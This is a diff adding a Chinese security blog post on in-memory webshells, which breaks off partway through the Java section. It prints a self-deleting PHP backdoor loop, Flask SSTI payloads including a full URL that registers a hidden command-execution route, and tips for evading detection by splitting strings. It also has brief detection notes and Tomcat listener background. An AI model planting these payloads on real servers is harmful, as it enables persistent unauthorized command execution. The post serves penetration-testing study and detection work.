@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Webshell 内存马分析 - Geekby&#39;s Blog</title><meta name="Description" content="Webshell 内存马分析"><meta property="og:title" content="Webshell 内存马分析" />
+<meta property="og:description" content="Webshell 内存马分析" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-09-22T10:00:00+08:00" />
+<meta property="article:modified_time" content="2021-09-22T10:00:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Webshell 内存马分析"/>
+<meta name="twitter:description" content="Webshell 内存马分析"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/" /><link rel="prev" href="https://www.geekby.site/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/" /><link rel="next" href="https://www.geekby.site/2021/09/ntlm-relay/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Webshell 内存马分析",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2021\/09\/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "渗透测试, 代码审计","wordcount":  789 ,
+        "url": "https:\/\/www.geekby.site\/2021\/09\/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90\/","datePublished": "2021-09-22T10:00:00+08:00","dateModified": "2021-09-22T10:00:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "Webshell 内存马分析"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Webshell 内存马分析</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="far fa-folder fa-fw"></i>渗透测试</a>&nbsp;<a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="far fa-folder fa-fw"></i>代码审计</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-09-22">2021-09-22</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 789 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-php-内存马">1 PHP 内存马</a>
+      <ul>
+        <li><a href="#11-原理">1.1 原理</a></li>
+        <li><a href="#12-检测">1.2 检测</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-python-内存马">2 Python 内存马</a>
+      <ul>
+        <li><a href="#21-原理">2.1 原理</a>
+          <ul>
+            <li><a href="#211-flask-route">2.1.1 flask route</a></li>
+            <li><a href="#212-flask-context">2.1.2 flask context</a></li>
+            <li><a href="#213-flask-内置函数">2.1.3 flask 内置函数</a></li>
+          </ul>
+        </li>
+        <li><a href="#22-实现">2.2 实现</a></li>
+        <li><a href="#22-检测">2.2 检测</a></li>
+        <li><a href="#23-逃逸">2.3 逃逸</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-java-内存马">3 Java 内存马</a>
+      <ul>
+        <li><a href="#31-简介">3.1 简介</a></li>
+        <li><a href="#32-原理">3.2 原理</a>
+          <ul>
+            <li><a href="#321-tomcat">3.2.1 Tomcat</a></li>
+            <li><a href="#322-listener-内存马">3.2.2 Listener 内存马</a></li>
+            <li><a href="#323-filter-内存马">3.2.3 Filter 内存马</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="webshell-内存马分析">Webshell 内存马分析</h1>
+<blockquote>
+<p>内存 webshell 相比于常规 webshell 更容易躲避传统安全监测设备的检测，通常被用来做持久化，规避检测，持续驻留目标服务器。无文件攻击、内存 Webshell、进程注入等基于内存的攻击手段也受到了大多数攻击者青睐。</p>
+</blockquote>
+<h2 id="1-php-内存马">1 PHP 内存马</h2>
+<h3 id="11-原理">1.1 原理</h3>
+<p>php 内存马也就是 php 不死马是将不死马启动后删除本身，在内存中执行死循环，使管理员无法删除木马文件。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+  <span class="nx">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="nx">ignore_user_abort</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="nx">unlink</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+  	<span class="nv">$content</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php @eval($_POST[&#34;zzz&#34;]) ?&gt;&#39;</span><span class="p">;</span>
+  	<span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;config.php&#34;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
+  	<span class="nx">usleep</span><span class="p">(</span><span class="mi">10000</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><code>ignore_user_abort</code>：函数设置与客户机断开是否会终止脚本的执行，如果设置为 true，则忽略与用户的断开。</li>
+<li><code>set_time_limit</code>：设置允许脚本运行的时间，单位为秒。如果设置为 0（零），没有时间方面的限制。</li>
+</ul>
+<h3 id="12-检测">1.2 检测</h3>
+<ul>
+<li>检查所有 php 进程处理请求的持续时间</li>
+<li>检测执行文件是否在文件系统真实存在</li>
+</ul>
+<h2 id="2-python-内存马">2 Python 内存马</h2>
+<h3 id="21-原理">2.1 原理</h3>
+<p>Python 内存马利用 flask 框架中 SSTI 注入来实现，flask 框架中在 web 应用模板渲染的过程中用到 <code>render_template_string()</code> 进行渲染，但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现 python 内存马的注入。</p>
+<p>在 icehexman <a href="https://github.com/iceyhexman/flask_memory_shell" target="_blank" rel="noopener noreffer">Github</a> 中对 flask 框架下的内存马进行了研究。</p>
+<h4 id="211-flask-route">2.1.1 flask route</h4>
+<p>类比 tomcat 注册路由的机制，如 filter，如果想实现 python 内存马，也应该研究下 flask 是否能动态注册路由。</p>
+<p>flask 常规注册的方式为使用装饰器 <code>@app.route()</code> 。而实际工作的函数为装饰器里调用的方法 <code>self.add_url_rule()</code> 。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221235167.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221235167.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221235167.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221235167.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221235167.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221235167.png-water_print" /></p>
+<p>add_url_rule 需要三个参数：</p>
+<ul>
+<li>URL：和装饰器 <code>app.route()</code> 的第一个参数一样，必须以 <code>/</code>  开始。</li>
+<li>endpoint：就是在使用 <code>url_for()</code> 进行跳转的时候，这个里面传入的第一个参数就是这个 endpoint 对应的值。这个值也可以不指定，默认值为函数名。</li>
+<li>view_func：只需要写方法名（也可以为匿名参数），如果使用方法名不要加括号，加括号表示将函数的返回值传给了 view_func 参数。</li>
+</ul>
+<h4 id="212-flask-context">2.1.2 flask context</h4>
+<p>想实现内存 webshell，关键点在于 <code>view_func</code> 。<code>view_func</code> 可以采用匿名函数定义逻辑，该方法要实现捕获参数值、执行命令、响应。</p>
+<p>Flask 的工作原理：当一个请求进入 Flask，首先会实例化一个 Request Context，这个上下文封装了请求的信息在 Request 中，并将这个上下文放入到栈 <code>_request_ctx_stack</code>  的结构中，也就是说获取当前的请求上下文等同于获取 <code>_request_ctx_stack</code>  的栈顶元素 <code>_request_ctx_stack.top</code> 。</p>
+<h4 id="213-flask-内置函数">2.1.3 flask 内置函数</h4>
+<p>通过 <code>{{...}}</code> 可以执行表达式，但是命名空间是受限的，没有 <code>builtins</code>，所以 <code>eval</code>、<code>popen</code> 这些函数是不能使用的。但是可以通过任意一个函数的 <code>func_globals</code> 而得到其的命名空间，而得到 <code>builtins</code>。</p>
+<p>Flask 内置了两个函数 <code>url_for</code> 和 <code>get_flashed_messages</code>。也就是构造命令执行，可以使用：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)}}</span>
+
+<span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;</span><span class="p">)}}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="22-实现">2.2 实现</h3>
+<p>以下面的 Demo 代码为例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
+<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">render_template_string</span>
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">hello_world</span><span class="p">():</span>
+    <span class="k">return</span> <span class="s1">&#39;Hello World&#39;</span>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/test&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">test</span><span class="p">():</span>
+    <span class="n">template</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span><span class="s1">        &lt;div class=&#34;center-content error&#34;&gt;
+</span><span class="s1">        &lt;h1&gt;Oops! That page doesn&#39;t exist.&lt;/h1&gt;
+</span><span class="s1">        &lt;h3&gt;</span><span class="si">%s</span><span class="s1">&lt;/h3&gt;
+</span><span class="s1">        &lt;/div&gt;
+</span><span class="s1">    &#39;&#39;&#39;</span> <span class="o">%</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;param&#39;</span><span class="p">))</span>
+
+    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="mi">8000</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>将 payload 拆解开：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span>
+	<span class="s2">&#34;app.add_url_rule(</span>
+		<span class="s1">&#39;/shell&#39;</span><span class="p">,</span> 
+		<span class="s1">&#39;shell&#39;</span><span class="p">,</span> 
+		<span class="k">lambda</span> <span class="p">:</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">_request_ctx_stack</span><span class="o">.</span><span class="n">top</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span> <span class="s1">&#39;whoami&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+		<span class="p">)</span>
+	<span class="s2">&#34;,</span>
+	<span class="p">{</span>
+		<span class="s1">&#39;_request_ctx_stack&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;_request_ctx_stack&#39;</span><span class="p">],</span>
+		<span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;current_app&#39;</span><span class="p">]</span>
+	<span class="p">}</span>
+<span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>lambda 即匿名函数，payload 中 <code>add_url_rule()</code> 函数的第三个参数定义了一个 lambda 匿名函数，其中通过 os 库的 popen() 函数执行从 Web 请求中获取的 <code>cmd</code> 参数值并返回结果，其中该参数值默认为 <code>whoami</code>。</p>
+<p>eval() 方法的语法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="nb">eval</span><span class="p">(</span><span class="n">expression</span><span class="p">[,</span> <span class="nb">globals</span><span class="p">[,</span> <span class="nb">locals</span><span class="p">]])</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>globals - 变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。指定全局变量。</p>
+<p>最终的 URL：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://IP:8000/param?param={{url_for.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27whoami%27)).read())%22,{%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]})}}
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221456525.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221456525.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221456525.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221456525.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221456525.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221456525.png-water_print" /></p>
+<h3 id="22-检测">2.2 检测</h3>
+<ul>
+<li>查看所有内建模块中是否包含 eval、exec 等可以执行代码的函数如：class <code>warnings.catch_warnings</code>、class <code>site.Quitter</code>等。</li>
+<li>检测 <code>self.add_url_rule()</code> 中特殊名字的路由如 shell 等。</li>
+</ul>
+<h3 id="23-逃逸">2.3 逃逸</h3>
+<p>以 Python 沙箱逃逸的技巧为例：</p>
+<ul>
+<li><code>url_for </code> 可用 <code>get_flashed_messages</code> 或 <code>request.application.__self__._get_data_for_json</code> 等替换；</li>
+<li>代码执行函数替换，如 exec 等替换 eval；</li>
+<li>字符串可采用拼接方式，如 <code>['__builtins__']['eval']</code> 变为 <code>['__bui'+'ltins__']['ev'+'al']</code>；</li>
+<li><code>__globals__</code> 可用 <code>__getattribute__('__globa'+'ls__')</code> 替换；</li>
+<li><code>[] </code>中括号可用 <code>.__getitem__()</code> 或 <code>.pop()</code> 替换；</li>
+<li>&hellip;</li>
+</ul>
+<h2 id="3-java-内存马">3 Java 内存马</h2>
+<h3 id="31-简介">3.1 简介</h3>
+<p>Java 内存马目前主要分为 2 类：</p>
+<ul>
+<li>Servlet-API 型
+<ul>
+<li>通过命令执行等方式动态注册一个新的 listener、filter 或者 servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如 spring 的 controller 内存马，tomcat 的 valve 内存马</li>
+</ul>
+</li>
+<li>字节码增强型
+<ul>
+<li>通过 java 的 instrumentation 动态修改已有代码，进而实现命令执行等功能。</li>
+</ul>
+</li>
+</ul>
+<h3 id="32-原理">3.2 原理</h3>
+<p>Servlet、Listener、Filter 由 <code>javax.servlet.ServletContext</code> 去加载，无论是使用 xml 配置文件还是使用 Annotation 注解配置，均由 Web 容器进行初始化，读取其中的配置属性，然后向容器中进行注册。</p>
+<p>Servlet 3.0 API 允许使 ServletContext 用动态进行注册，在 Web 容器初始化的时候（即建立 ServletContext 对象的时候）进行动态注册。不同的容器实现方式略有差异，下文主要以 Tomcat 为例。</p>
+<h4 id="321-tomcat">3.2.1 Tomcat</h4>
+<p>Tomcat 中主要包括四种容器，Engine、Host、Context、Wrapper</p>
+<ol>
+<li>Engine 为外部接口，可以配置多个 Host</li>
+<li>一个 Host 可以包含多个 Context(WEB 应用)</li>
+<li>一个 Context 可以包含多个 Wrapper</li>
+<li>每个 Wrapper 对应 1 个 Servlet</li>
+</ol>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221555587.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221555587.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221555587.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221555587.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221555587.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221555587.png-water_print" /></p>
+<p>Context 对应的 Web 应用, 每一个 Context 都有唯一的 path, 这里的 path 不是指 servlet 绑定的 WebServlet 地址, 而是指的是独立的一个 Web 应用地址，就好比 Tomat 默认的 / 地址和 manager 地址就是两个不同的 web 应用，所以对应两个不同的 Context，要添加 Context 需要在 server.xml 中配置 docbase。</p>
+<p>在一个 web 应用中可以配置多个访问路径，比如登录页面，后台管理等，对于同一个 Context 中不同的 WebServlet 地址，将会分配不同的 Wrapper。这就说明了每个 Context 可以对应多个 Wrapper，每个 Wrapper 对应一个 Servlet。说明同一个 web 应用 context 相同但是对应的 Wrapper 不同，然后根据不同的 Servlet 服务展示不同的内容。</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw"></i>技巧<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">IDEA 创建 Java Web 项目可参考：<a href="https://blog.csdn.net/gaoqingliang521/article/details/108677301" target="_blank" rel="noopener noreffer">https://blog.csdn.net/gaoqingliang521/article/details/108677301</a></div>
+        </div>
+    </div>
+<h4 id="322-listener-内存马">3.2.2 Listener 内存马</h4>
+<blockquote>
+<p>监听器用于监听 Web 应用中某些对象的创建、销毁、增加，修改，删除等动作的发生，然后作出相应的响应处理。当监听范围的对象的状态发生变化的时候，服务器自动调用监听器对象中的方法。常用于统计网站在线人数、系统加载时进行信息初始化、统计网站的访问量等等。</p>
+</blockquote>
+<p>主要由三部分构成：</p>
+<ul>
+<li>事件源：被监听的对象</li>
+<li>监听器：监听的对象，事件源的变化会触发监听器的响应行为</li>
+<li>响应行为：监听器监听到事件源的状态变化时所执行的动作</li>
+</ul>
+<p>在初始化时，需要将事件源和监听器进行绑定，也就是注册监听器。请求网站的时候，程序先自动执行 listener 监听器的内容, 再去执行 filter 过滤器，如果存在多个过滤器则会组成过滤链，最后一个过滤器将会去执行 Servlet 的 service 方法，即 <code>Listener -&gt; Filter -&gt; Servlet</code>。</p>
+<p>Listener 是最先被加载的, 所以可以利用动态注册恶意的 Listener 植入内存马。</p>
+<ul>
+<li>Listener 分类
+<ul>
+<li>ServletContext 监听，服务器启动和终止时触发
+<ul>
+<li>ServletContextListener：用于监听整个 Servlet 上下文（创建、销毁）</li>
+<li>ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性）</li>
+</ul>
+</li>
+<li>Session 监听，Session 建立摧毁时触发
+<ul>
+<li>javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听</li>
+<li>javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听</li>
+</ul>
+</li>
+<li>Request 监听，每次访问服务时触发
+<ul>
+<li>ServletRequestListener：对 Request 请求进行监听（创建、销毁）</li>
+<li>ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性）</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>如果能动态添加 Listener 那 Request 监听最适合植入内存马。</p>
+<p><code>ServletRequestListener</code> 提供两个方法：<code>requestInitialized</code> 和 <code>requestDestroyed</code>，两个方法均接收 <code>ServletRequestEvent</code> 作为参数，<code>ServletRequestEvent</code> 中又储存了 <code>ServletContext</code> 对象和 <code>ServletRequest</code> 对象，因此在访问请求过程中可以在 request 创建和销毁时实现自己的恶意代码，完成内存马的实现。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221719716.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221719716.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221719716.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109221719716.png-water_print 2x"
